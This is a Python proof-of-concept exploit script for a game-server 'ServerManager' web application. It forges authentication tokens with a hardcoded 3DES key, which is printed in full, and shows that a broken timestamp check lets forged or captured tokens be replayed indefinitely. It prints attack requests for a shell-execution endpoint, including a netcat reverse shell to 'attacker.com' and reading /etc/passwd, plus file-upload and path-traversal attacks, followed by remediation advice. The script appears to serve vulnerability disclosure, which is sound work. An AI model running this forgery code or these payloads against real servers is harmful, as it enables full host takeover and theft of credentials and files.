#!/usr/bin/env python3
"""
PoC #2: ServerManager Replay Attack & Arbitrary File/Command Execution (CRITICAL)

Demonstrates:
  1. Hardcoded 3DES key allows token forgery
  2. Impossible timestamp check (gap < -60000 && gap > 60000) — always false
     -> Captured tokens can be replayed indefinitely
  3. /execute endpoint runs arbitrary shell commands
  4. /uploadfile writes arbitrary files + auto-runs sync.sh
  5. /downloadfile has path traversal (no canonicalization)
  6. Configuration.java only checks path prefix, allowing ../ traversal

Source references:
  - SecurityUtils.java:9   -> SESSION_KEY = "laoutqqhd9272l;javnzy220"
  - SecurityUtils.java:140 -> if (gap < -60000 && gap > 60000) // IMPOSSIBLE
  - ExecuteServlet.java:56 -> calls shell
  - UploadFileServlet.java:41 -> writes file + runs sync.sh
  - DownloadFileServlet.java:46 -> no canonicalization
  - Configuration.java:55 -> prefix-only path check
  - web.xml -> public endpoints: /execute, /uploadfile, /downloadfile
"""

import hashlib
import struct
import sys
import time
import argparse
import urllib.request
import urllib.error
from Crypto.Cipher import DES3
from Crypto.Util.Padding import pad

# ---------------------------------------------------------------------------
# Hardcoded key from SecurityUtils.java:9
# ---------------------------------------------------------------------------
SESSION_KEY = "laoutqqhd9272l;javnzy220"  # 24 bytes for 3DES

# ---------------------------------------------------------------------------
# 3DES encrypt/decrypt helpers (matching SecurityUtils.java logic)
# ---------------------------------------------------------------------------

def fixup_key(key_bytes):
    """Apply DES parity fixup (SecurityUtils.fixUpKey)."""
    result = bytearray(key_bytes)
    for i in range(len(result)):
        b = result[i]
        result[i] = (b & 0xFE) | (((b >> 1) ^ (b >> 2) ^ (b >> 3) ^
                                     (b >> 4) ^ (b >> 5) ^ (b >> 6) ^
                                     (b >> 7)) & 0x01)
    return bytes(result)

def long_to_bytes(val):
    """Convert long to 8-byte array (SecurityUtils.longToBytes)."""
    return struct.pack(">q", val)

def bytes_to_long(data):
    """Convert 8-byte array to long."""
    return struct.unpack(">q", data)[0]

def encrypt_token(password, timestamp=None):
    """
    Encrypt a token matching SecurityUtils.encryptPassword().
    Format: password(UTF-8) + timestamp(8 bytes) + MD5(16 bytes)
    Then 3DES encrypt the whole thing.
    """
    if timestamp is None:
        timestamp = int(time.time() * 1000)

    # Build plaintext: password + timestamp + MD5
    pwd_bytes = password.encode("utf-8")
    time_bytes = long_to_bytes(timestamp)
    combined = pwd_bytes + time_bytes
    md5 = hashlib.md5(combined).digest()
    plaintext = pwd_bytes + time_bytes + md5

    # 3DES encrypt
    key_bytes = fixup_key(SESSION_KEY.encode("utf-8")[:24])
    cipher = DES3.new(key_bytes, DES3.MODE_ECB)
    padded = pad(plaintext, 8)
    encrypted = cipher.encrypt(padded)

    return encrypted.hex()

def decrypt_token(enc_hex):
    """Decrypt a token (for verification)."""
    key_bytes = fixup_key(SESSION_KEY.encode("utf-8")[:24])
    cipher = DES3.new(key_bytes, DES3.MODE_ECB)
    encrypted = bytes.fromhex(enc_hex)
    decrypted = cipher.decrypt(encrypted)

    # Strip padding
    pad_len = decrypted[-1]
    if pad_len <= 8:
        decrypted = decrypted[:-pad_len]

    # Parse: password + timestamp(8) + MD5(16)
    if len(decrypted) < 24:
        raise ValueError("Token too short")

    pwd_len = len(decrypted) - 24
    password = decrypted[:pwd_len].decode("utf-8")
    time_bytes = decrypted[pwd_len:pwd_len + 8]
    timestamp = bytes_to_long(time_bytes)
    md5_received = decrypted[pwd_len + 8:]

    return password, timestamp, md5_received.hex()


# ---------------------------------------------------------------------------
# Attack demonstrations
# ---------------------------------------------------------------------------

def demo_token_forgery():
    """Demonstrate token forgery with hardcoded key."""
    print("\n[!] Token Forgery with Hardcoded 3DES Key:")
    print(f"    Key: '{SESSION_KEY}' (SecurityUtils.java:9)")
    print()

    # Create a valid token
    token = encrypt_token("admin_password", int(time.time() * 1000))
    print(f"    Generated token: {token[:40]}...")
    print()

    # Decrypt it back to verify
    pwd, ts, md5 = decrypt_token(token)
    print(f"    Decrypted -> password='{pwd}', timestamp={ts}")
    print(f"    MD5: {md5}")
    print()
    print("    [!] Anyone with the hardcoded key can forge valid tokens.")

def demo_replay_attack():
    """Demonstrate the impossible timestamp check."""
    print("\n[!] Replay Attack — Impossible Timestamp Check:")
    print("    SecurityUtils.java:140:")
    print('    if (gap < -60000 && gap > 60000) {')
    print('        throw new Exception();')
    print('    }')
    print()
    print("    This condition is IMPOSSIBLE:")
    print("    gap cannot be BOTH < -60000 AND > 60000 simultaneously.")
    print("    The programmer likely meant || (OR) but wrote && (AND).")
    print()
    print("    RESULT: Timestamp validation NEVER throws.")
    print("    Any captured token is valid FOREVER.")

    # Demonstrate: create a token with timestamp from 1 year ago
    old_timestamp = int(time.time() * 1000) - 365 * 24 * 3600 * 1000
    old_token = encrypt_token("admin_password", old_timestamp)
    pwd, ts, md5 = decrypt_token(old_token)
    print(f"\n    Token from 1 year ago (ts={ts}):")
    print(f"    {old_token[:40]}...")
    print(f"    Gap from now: {(ts - int(time.time()*1000)) / 1000:.0f} seconds")
    print("    [!] This token would PASS validation despite being 1 year old!")

def demo_execute_endpoint(base_url, token):
    """Demonstrate /execute endpoint RCE."""
    print("\n[!] /execute Endpoint — Arbitrary Shell Commands:")
    print("    ExecuteServlet.java:56 calls shell directly.")
    print()
    print("    Example attack:")
    print(f"    POST {base_url}/execute?token={token[:20]}...")
    print('    Body: cmd=cat /etc/passwd')
    print()
    print("    Or reverse shell:")
    print('    Body: cmd=nc -e /bin/sh attacker.com 4444')
    print()
    print("    [!] Full shell access on the game server host.")

def demo_uploadfile_endpoint(base_url, token):
    """Demonstrate /uploadfile endpoint arbitrary file write."""
    print("\n[!] /uploadfile Endpoint — Arbitrary File Write + Auto-Exec:")
    print("    UploadFileServlet.java:41 writes file then runs sync.sh")
    print()
    print("    Attack scenario:")
    print(f"    1. POST {base_url}/uploadfile?token=...")
    print("       Upload malicious JSP/PHP shell")
    print("    2. sync.sh auto-executes (may deploy the shell)")
    print("    3. Access web shell via browser")
    print()
    print("    [!] Can overwrite game configs, deploy backdoors, etc.")

def demo_downloadfile_endpoint(base_url, token):
    """Demonstrate /downloadfile path traversal."""
    print("\n[!] /downloadfile Endpoint — Path Traversal:")
    print("    DownloadFileServlet.java:46 — no canonicalization")
    print("    Configuration.java:55 — only checks path prefix")
    print()
    print("    Attack:")
    print(f"    GET {base_url}/downloadfile?token=...&path=../../../etc/passwd")
    print()
    print("    [!] Can read any file the server process can access:")
    print("    - Database credentials")
    print("    - Configuration files")
    print("    - Source code")
    print("    - Private keys")

def main():
    parser = argparse.ArgumentParser(
        description="PoC: ServerManager Replay Attack & RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--url", default="http://127.0.0.1:8080/ServerManager",
                        help="ServerManager base URL")
    parser.add_argument("--demo", action="store_true",
                        help="Run demo without connecting")
    args = parser.parse_args()

    print("=" * 60)
    print("PoC #2: ServerManager Replay Attack & RCE")
    print("=" * 60)
    print()
    print("VULNERABILITY SUMMARY:")
    print("  1. Hardcoded 3DES key (SecurityUtils.java:9)")
    print("  2. Impossible timestamp check -> infinite replay (SecurityUtils.java:140)")
    print("  3. /execute -> arbitrary shell commands (ExecuteServlet.java:56)")
    print("  4. /uploadfile -> arbitrary file write + sync.sh (UploadFileServlet.java:41)")
    print("  5. /downloadfile -> path traversal (DownloadFileServlet.java:46)")
    print("  6. Public endpoints in web.xml")
    print()
    print("IMPACT: Full host compromise, data exfiltration, persistence")
    print()

    demo_token_forgery()
    demo_replay_attack()

    if args.demo:
        print("\n" + "-" * 40)
        print("[DEMO MODE] Showing attack flow...")
        demo_execute_endpoint(args.url, "FAKE_TOKEN_FOR_DEMO")
        demo_uploadfile_endpoint(args.url, "FAKE_TOKEN_FOR_DEMO")
        demo_downloadfile_endpoint(args.url, "FAKE_TOKEN_FOR_DEMO")
        print()
        print("REMEDIATION:")
        print("  - Store 3DES key in environment variable or HSM, not source code")
        print("  - Fix timestamp check: if (gap < -60000 || gap > 60000)")
        print("  - Add nonce/replay protection (server-side token store)")
        print("  - Remove /execute endpoint or restrict to predefined safe commands")
        print("  - Canonicalize paths in DownloadFileServlet")
        print("  - Validate full canonical path, not just prefix")
        print("  - Remove sync.sh auto-execution from UploadFileServlet")
        print("  - Add authentication beyond single shared token")
        print("  - Restrict ServerManager to localhost only")
    else:
        # Generate a valid token for the target
        token = encrypt_token("admin_password")
        print(f"\n[*] Generated token for {args.url}:")
        print(f"    {token}")
        demo_execute_endpoint(args.url, token)
        demo_uploadfile_endpoint(args.url, token)
        demo_downloadfile_endpoint(args.url, token)

if __name__ == "__main__":
    main()